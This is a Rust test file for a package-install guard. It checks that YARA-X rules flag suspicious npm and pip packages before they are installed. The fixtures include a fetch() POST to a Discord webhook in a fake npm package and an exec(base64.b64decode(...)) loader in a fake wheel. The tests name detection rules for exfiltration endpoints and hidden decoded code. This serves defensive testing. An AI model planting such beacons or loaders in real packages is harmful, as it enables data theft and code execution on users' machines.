//! FR-019 (SPEC-015, TC-019-*): YARA-X rules over npm packages and pip
//! wheels. Registries are loopback fixtures; user rules live in a disposable
//! trusted config directory.

mod npm_support;
mod pip_support;

use fail2commit_core::npm;
use fail2commit_core::paths::TrustedPaths;
use fail2commit_core::pip;
use fail2commit_core::protocol::{ApprovalRequest, Decision, Finding, FindingAction, FindingKind};
use fail2commit_core::scan::yara::{self, Budget, Matcher};
use fail2commit_core::scan::{Ecosystem, PackageId};
use fail2commit_core::settings::RuleSettings;
use fail2commit_core::ResultCode;
use npm_support::{require_node, snapshot, Behavior, Env, FakeBackend, Pkg, Registry, Run};
use std::collections::BTreeSet;
use std::io::Write;
use std::path::Path;
use std::sync::{Arc, Mutex};

const HOOK: &str =
    "fetch('https://discord.com/api/webhooks/123456789/abcdef', {method: 'POST'});\n";

fn yara_findings(f: &[Finding]) -> Vec<&Finding> {
    f.iter()
        .filter(|f| f.kind == FindingKind::YaraMatch)
        .collect()
}

fn write_rule(paths: &TrustedPaths, name: &str, body: &str) {
    let dir = yara::user_rules_dir(paths);
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(dir.join(name), body).unwrap();
}

fn npm_env(pkg: &Pkg) -> (Registry, Env) {
    let reg = Registry::start();
    reg.publish(pkg);
    let env = Env::new(
        &reg,
        &format!(
            r#"{{"name":"app","version":"1.0.0","dependencies":{{"{}":"{}"}}}}"#,
            pkg.name, pkg.version
        ),
    );
    (reg, env)
}

/// Run a guarded `npm install`; the approval answers `decision`.
fn npm_install(
    env: &Env,
    decision: Decision,
) -> (
    fail2commit_core::Result<npm::NpmOutcome>,
    Vec<ApprovalRequest>,
) {
    let backend = FakeBackend::new(false, false);
    let run = Run::new(env, &backend);
    let r = npm::execute(
        &run.deps(Behavior {
            decision,
            ..Behavior::default()
        }),
        &env.request(&["install"]),
    );
    let reqs = run.requests.lock().unwrap().clone();
    (r, reqs)
}

/// TC-019-1
#[test]
fn bundled_rules_compile_and_list() {
    let m = Matcher::bundled();
    let rules = m.rules();
    assert!(rules.len() >= 10, "{rules:?}");
    assert!(rules
        .iter()
        .all(|r| r.namespace == "bundled" && !r.description.is_empty()));
    let d = tempfile::tempdir().unwrap();
    let out = std::process::Command::new(env!("CARGO_BIN_EXE_fail2commit"))
        .args(["rules", "list"])
        .env("FAIL2COMMIT_HOME", d.path())
        .output()
        .unwrap();
    let text =
        String::from_utf8_lossy(&out.stderr).to_string() + &String::from_utf8_lossy(&out.stdout);
    assert!(out.status.success(), "{text}");
    assert!(text.contains("bundled:exfiltration_endpoint - "), "{text}");
    assert!(text.contains(&format!("{} rule(s)", rules.len())), "{text}");
}

/// TC-019-2
#[test]
fn npm_install_pauses_on_bundled_rule_match() {
    require_node();
    let (_reg, env) = npm_env(&Pkg::new("hooky", "1.0.0").file("lib/hook.js", HOOK));
    let before = snapshot(&env.project);
    let (r, reqs) = npm_install(&env, Decision::Cancel);
    let e = r.unwrap_err();
    assert_eq!(e.code, ResultCode::Rejected, "{e}");
    assert_eq!(reqs.len(), 1, "the install waits for approval");
    let y = yara_findings(&reqs[0].findings);
    let hit = y
        .iter()
        .find(|f| f.evidence.contains("bundled:exfiltration_endpoint"))
        .unwrap_or_else(|| panic!("{:?}", reqs[0].findings));
    assert_eq!(hit.action, FindingAction::Approve);
    assert_eq!(hit.target.as_deref(), Some("npm:hooky@1.0.0"));
    assert_eq!(hit.location.as_deref(), Some("lib/hook.js:1"));
    assert!(
        hit.evidence.contains("when your project loads it"),
        "{}",
        hit.evidence
    );
    assert_eq!(
        snapshot(&env.project),
        before,
        "cancel leaves the project unchanged"
    );
}

/// A wheel with one extra module.
fn wheel_with(name: &str, version: &str, extra: (&str, &str)) -> (String, Vec<u8>) {
    let norm = name.replace('-', "_");
    let dist = format!("{norm}-{version}.dist-info");
    let mut buf = std::io::Cursor::new(Vec::new());
    let mut z = zip::ZipWriter::new(&mut buf);
    let o = zip::write::SimpleFileOptions::default();
    for (n, c) in [
        (format!("{norm}/__init__.py"), "X = 1\n".to_string()),
        (format!("{norm}/{}", extra.0), extra.1.to_string()),
        (
            format!("{dist}/METADATA"),
            format!("Metadata-Version: 2.1\nName: {name}\nVersion: {version}\n"),
        ),
        (
            format!("{dist}/WHEEL"),
            "Wheel-Version: 1.0\nGenerator: f2c-test\nRoot-Is-Purelib: true\nTag: py3-none-any\n"
                .into(),
        ),
        (format!("{dist}/RECORD"), String::new()),
    ] {
        z.start_file(n, o).unwrap();
        z.write_all(c.as_bytes()).unwrap();
    }
    z.finish().unwrap();
    (
        format!("{norm}-{version}-py3-none-any.whl"),
        buf.into_inner(),
    )
}

/// TC-019-3
#[test]
fn pip_install_pauses_on_bundled_rule_match() {
    let env = pip_support::Env::new();
    let index = pip_support::TestIndex::start();
    let venv = tempfile::tempdir().unwrap();
    let python = pip_support::make_venv(&venv.path().join("v"));
    let (file, bytes) = wheel_with(
        "shady-lib",
        "1.0.0",
        ("beacon.py", "exec(base64.b64decode('cHJpbnQoMSk='))\n"),
    );
    let sha = pip_support::sha256_hex(&bytes);
    index.add_raw("shady-lib", &file, bytes, &sha);
    let seen: Arc<Mutex<Vec<ApprovalRequest>>> = Arc::default();
    let s2 = seen.clone();
    let mut seams = pip_support::seams(&index);
    seams.approve = Box::new(move |r| {
        s2.lock().unwrap().push(r.clone());
        Ok(Decision::Cancel)
    });
    let ctx = env.ctx();
    let e = pip::install(
        &ctx,
        &python,
        &pip_support::args(&["shady-lib==1.0.0"]),
        &env.workdir(),
        &seams,
    )
    .unwrap_err();
    assert_eq!(e.code, ResultCode::Rejected, "{e}");
    let reqs = seen.lock().unwrap();
    assert_eq!(reqs.len(), 1);
    let hit = yara_findings(&reqs[0].findings)
        .into_iter()
        .find(|f| {
            f.evidence
                .contains("bundled:hidden_code_python_exec_decode")
        })
        .unwrap_or_else(|| panic!("{:?}", reqs[0].findings))
        .clone();
    assert_eq!(hit.location.as_deref(), Some("shady_lib/beacon.py:1"));
    assert!(
        hit.target.as_deref().unwrap().starts_with("PyPI:shady"),
        "{:?}",
        hit.target
    );
    assert!(
        !pip_support::has_name(&python, "shady-lib"),
        "cancel installs nothing"
    );
}

fn clean_pkg() -> PackageId {
    PackageId {
        ecosystem: Ecosystem::Npm,
        name: "clean".into(),
        version: "1.0.0".into(),
    }
}

fn pkg_dir(files: &[(&str, &[u8])]) -> tempfile::TempDir {
    let d = tempfile::tempdir().unwrap();
    for (p, b) in files {
        let f = d.path().join(p);
        std::fs::create_dir_all(f.parent().unwrap()).unwrap();
        std::fs::write(f, b).unwrap();
    }
    d
}

/// TC-019-4
#[test]
fn user_rule_matches_clean_package() {
    let home = tempfile::tempdir().unwrap();
    let paths = TrustedPaths::under(home.path());
    paths.ensure().unwrap();
    write_rule(
        &paths,
        "team-policy.yar",
        "rule internal_marker { meta: description = \"internal marker string\" strings: $a = \"ACME-INTERNAL-ONLY\" condition: $a }\n",
    );
    let m = Matcher::load(&paths, &RuleSettings { enabled: true })
        .unwrap()
        .unwrap();
    let d = pkg_dir(&[("index.js", b"// ACME-INTERNAL-ONLY\nmodule.exports = 1;\n")]);
    let f = yara::scan_package(
        &m,
        &clean_pkg(),
        d.path(),
        &BTreeSet::new(),
        &mut Budget::default(),
    );
    assert_eq!(f.len(), 1, "{f:?}");
    assert_eq!(f[0].kind, FindingKind::YaraMatch);
    assert!(
        f[0].evidence
            .contains("rule user.team_policy:internal_marker (internal marker string)"),
        "{}",
        f[0].evidence
    );
    assert_eq!(f[0].location.as_deref(), Some("index.js:1"));

    // Through the npm guard as well.
    require_node();
    let (_reg, env) =
        npm_env(&Pkg::new("plain", "1.0.0").file("index.js", "// ACME-INTERNAL-ONLY\n"));
    write_rule(
        &env.paths,
        "team-policy.yar",
        "rule internal_marker { strings: $a = \"ACME-INTERNAL-ONLY\" condition: $a }\n",
    );
    let (r, reqs) = npm_install(&env, Decision::ApproveOnce);
    let out = r.expect("approved install");
    assert_eq!(reqs.len(), 1);
    assert!(yara_findings(&out.findings)
        .iter()
        .any(|f| f.evidence.contains("user.team_policy:internal_marker")));
}

/// TC-019-5
#[test]
fn user_rule_syntax_error_stops_install_naming_file() {
    require_node();
    let (reg, env) = npm_env(&Pkg::new("plain", "1.0.0").script("postinstall", "node -e 1"));
    write_rule(
        &env.paths,
        "broken.yar",
        "rule ok { condition: true }\n\nrule bad {\n  condition:\n    $nope\n}\n",
    );
    let before = snapshot(&env.project);
    let backend = FakeBackend::new(true, true);
    let run = Run::new(&env, &backend);
    let e = npm::execute(&run.deps(Behavior::default()), &env.request(&["install"])).unwrap_err();
    assert_eq!(e.code, ResultCode::InvalidInput, "{e}");
    assert!(e.message.contains("broken.yar"), "{}", e.message);
    assert!(
        e.message.contains("broken.yar:5:"),
        "names the line: {}",
        e.message
    );
    assert!(backend.jobs().is_empty(), "no package code ran");
    assert!(
        reg.hits().is_empty(),
        "nothing was resolved: {:?}",
        reg.hits()
    );
    assert_eq!(snapshot(&env.project), before);
}

fn cli(home: &Path, cwd: &Path, args: &[&str]) -> (i32, String) {
    let out = std::process::Command::new(env!("CARGO_BIN_EXE_fail2commit"))
        .args(args)
        .current_dir(cwd)
        .env("FAIL2COMMIT_HOME", home)
        .output()
        .unwrap();
    (
        out.status.code().unwrap_or(-1),
        String::from_utf8_lossy(&out.stdout).to_string() + &String::from_utf8_lossy(&out.stderr),
    )
}

/// TC-019-6
#[test]
fn rules_check_cli_reports_file_and_line() {
    let home = tempfile::tempdir().unwrap();
    let work = tempfile::tempdir().unwrap();
    // A workspace rules folder is never read.
    std::fs::create_dir_all(work.path().join("rules")).unwrap();
    std::fs::write(work.path().join("rules/ws.yar"), "rule ws {").unwrap();
    let (code, out) = cli(home.path(), work.path(), &["rules", "check"]);
    assert_eq!(code, 0, "{out}");
    assert!(
        out.contains("ok    (bundled) f2c_supply_chain.yar"),
        "{out}"
    );
    assert!(!out.contains("ws.yar"), "{out}");

    let paths = TrustedPaths::under(home.path());
    write_rule(
        &paths,
        "good.yar",
        "rule g { strings: $a = \"x1y2z3\" condition: $a }\n",
    );
    write_rule(
        &paths,
        "bad.yara",
        "rule b {\n  strings:\n    $a = \"q\n  condition: $a\n}\n",
    );
    let (code, out) = cli(home.path(), work.path(), &["rules", "check"]);
    assert_eq!(code, 2, "{out}");
    assert!(out.contains("good.yar (1 rule(s))"), "{out}");
    assert!(out.contains("bad.yara:3:"), "{out}");
    assert!(out.contains("1 rule file(s) do not compile"), "{out}");
}

/// TC-019-7
#[test]
fn clean_package_has_no_match_within_budget() {
    let body =
        "function add(a, b) {\n  return a + b;\n}\nmodule.exports = { add };\n".repeat(2_000);
    let files: Vec<(String, Vec<u8>)> = (0..200)
        .map(|i| (format!("lib/m{i}.js"), body.clone().into_bytes()))
        .collect();
    let refs: Vec<(&str, &[u8])> = files
        .iter()
        .map(|(p, b)| (p.as_str(), b.as_slice()))
        .collect();
    let d = pkg_dir(&refs);
    let m = Matcher::bundled();
    let start = std::time::Instant::now();
    let f = yara::scan_package(
        &m,
        &clean_pkg(),
        d.path(),
        &BTreeSet::new(),
        &mut Budget::default(),
    );
    let took = start.elapsed();
    assert!(f.is_empty(), "{f:?}");
    let mb = files.iter().map(|(_, b)| b.len()).sum::<usize>() as f64 / 1e6;
    eprintln!("TC-019-7: {mb:.1} MB in 200 files matched in {took:?}");
    assert!(took < std::time::Duration::from_secs(10), "{took:?}");
}

/// TC-019-8
#[test]
fn bounds_report_incomplete_scan() {
    let big = vec![b'a'; (yara::MAX_FILE + 1) as usize];
    let d = pkg_dir(&[("big.bin", &big), ("ok.js", b"module.exports = 1;\n")]);
    let f = yara::scan_package(
        &Matcher::bundled(),
        &clean_pkg(),
        d.path(),
        &BTreeSet::new(),
        &mut Budget::default(),
    );
    assert_eq!(f.len(), 1, "{f:?}");
    assert_eq!(f[0].kind, FindingKind::IncompleteScan);
    assert_eq!(f[0].action, FindingAction::Approve);
    assert_eq!(f[0].location.as_deref(), Some("big.bin"));
    assert!(
        f[0].evidence.contains("larger than 32 MiB"),
        "{}",
        f[0].evidence
    );
}

/// TC-019-9
#[test]
fn disabled_rules_skip_matching() {
    let home = tempfile::tempdir().unwrap();
    let paths = TrustedPaths::under(home.path());
    paths.ensure().unwrap();
    write_rule(&paths, "broken.yar", "rule {");
    assert!(Matcher::load(&paths, &RuleSettings { enabled: false })
        .unwrap()
        .is_none());
    let e = Matcher::load(&paths, &RuleSettings { enabled: true })
        .err()
        .expect("broken");
    assert_eq!(e.code, ResultCode::InvalidInput);

    require_node();
    let (_reg, mut env) = npm_env(&Pkg::new("hooky", "1.0.0").file("lib/hook.js", HOOK));
    env.settings.rules.enabled = false;
    write_rule(&env.paths, "broken.yar", "rule {");
    let (r, _reqs) = npm_install(&env, Decision::ApproveOnce);
    let out = r.expect("a broken user file is not an install error when rules are off");
    assert!(
        yara_findings(&out.findings).is_empty(),
        "{:?}",
        out.findings
    );
}
